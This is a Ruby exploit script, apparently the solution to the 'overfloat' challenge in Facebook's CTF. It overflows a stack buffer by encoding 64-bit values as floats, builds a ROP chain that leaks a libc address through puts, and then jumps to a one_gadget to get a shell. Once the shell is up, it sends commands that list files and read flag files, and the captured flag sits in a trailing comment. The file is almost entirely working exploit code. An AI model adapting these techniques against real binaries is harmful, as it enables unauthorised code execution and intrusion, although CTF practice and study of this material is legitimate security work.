#!/usr/bin/env ruby
# encoding: ascii-8bit
require 'pry'
require 'pwn'        # https://github.com/peter50216/pwntools-ruby
require 'heapinfo'   # https://github.com/david942j/heapinfo

host, port = 'challenges.fbctf.com', 1341
@local = false
if ARGV.empty?
  host = '127.0.0.1'; @local = true
else
  raise ArgumentError, 'host not set' if host.empty?
end
$z = Sock.new host, port
def z;$z;end
@p = 'overfloat'
def h;@h ||= heapinfo(@p);end
def elf; @elf ||= ELF.new(@p); end
def debug!; context.log_level = :debug; end
#================= Exploit Start ====================
context.arch = :amd64
# debug!

pop_rdi = 0x400a83
main = 0x400993
rop1 = [
  0, 0, 0, 0, 0, 0,
  rbp=0,
  pop_rdi,
  elf.got['puts'],
  elf.plt['puts'],
  main, 0xdeadbeef
]

rop1.each do |v|
  low = v & 0xffffffff
  high = v >> 32
  z.gets 'LAT'
  z.puts p32(low).unpack('F*')[0]
  z.gets 'LON'
  z.puts p32(high).unpack('F*')[0]
end
z.puts 'done'
z.gets "BON VOYAGE!\n"
libc = ELF.new('../libc-2.27.so')
libc.address = (z.readn(6) + "\x00\x00").u64 - 0x809c0
log.dump libc.address.hex
h.offset(libc.address)

z.gets 'WHERE WOULD YOU LIKE TO GO?'

rop2 = [
  0, 0, 0, 0, 0, 0,
  rbp=0,
  libc.one_gadgets[1],
  0,0,0,0,0,0,0,0,0,0
]

rop2.each do |v|
  low = v & 0xffffffff
  high = v >> 32
  z.gets 'LAT'
  z.puts p32(low).unpack('F*')[0]
  z.gets 'LON'
  z.puts p32(high).unpack('F*')[0]
end
z.puts 'done'
z.puts 'ls -la; cat flag* /flag* /home/`whoami`/flag*'

z.interact

# fb{FloatsArePrettyEasy...}
